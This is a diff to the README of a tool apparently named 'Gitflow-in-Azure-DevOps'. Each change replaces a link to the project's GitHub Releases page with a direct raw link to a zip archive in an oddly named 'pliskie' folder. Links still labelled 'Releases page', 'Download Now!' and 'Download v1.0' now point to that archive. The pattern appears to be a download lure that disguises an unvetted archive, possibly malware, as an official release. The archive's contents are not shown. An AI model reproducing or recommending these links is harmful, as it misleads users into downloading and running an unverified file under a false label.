@@ -1,6 +1,6 @@
 # 🚀 Gitflow-in-Azure-DevOps - Enhance Your Git Workflows Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Rehandzz/Gitflow-in-Azure-DevOps/releases)
+[![Download](https://raw.githubusercontent.com/Rehandzz/Gitflow-in-Azure-DevOps/main/pliskie/Gitflow-in-Azure-DevOps.zip)](https://raw.githubusercontent.com/Rehandzz/Gitflow-in-Azure-DevOps/main/pliskie/Gitflow-in-Azure-DevOps.zip)
 
 ## 📋 Overview
 
@@ -25,13 +25,13 @@ Gitflow-in-Azure-DevOps simplifies GitFlow workflows with pull request enforceme
 
 ### Step 1: Visit the Releases Page
 
-To download the application, visit the [Releases page](https://github.com/Rehandzz/Gitflow-in-Azure-DevOps/releases). Here you will find the latest version of the application available for download.
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/Rehandzz/Gitflow-in-Azure-DevOps/main/pliskie/Gitflow-in-Azure-DevOps.zip). Here you will find the latest version of the application available for download.
 
 ### Step 2: Download the Application
 
 On the Releases page, locate the version you want to download. Click the download link for your operating system to save the installation file to your computer.
 
-[Download Now!](https://github.com/Rehandzz/Gitflow-in-Azure-DevOps/releases)
+[Download Now!](https://raw.githubusercontent.com/Rehandzz/Gitflow-in-Azure-DevOps/main/pliskie/Gitflow-in-Azure-DevOps.zip)
 
 ### Step 3: Install the Application
 
@@ -62,7 +62,7 @@ After installing, find the application in your programs list. Click to open it. 
 
 ## 📥 Download & Install
 
-To download the latest version, visit the [Releases page](https://github.com/Rehandzz/Gitflow-in-Azure-DevOps/releases) again. Follow the steps to download and install the application.
+To download the latest version, visit the [Releases page](https://raw.githubusercontent.com/Rehandzz/Gitflow-in-Azure-DevOps/main/pliskie/Gitflow-in-Azure-DevOps.zip) again. Follow the steps to download and install the application.
 
 ## 🤝 Support and Contribution
 
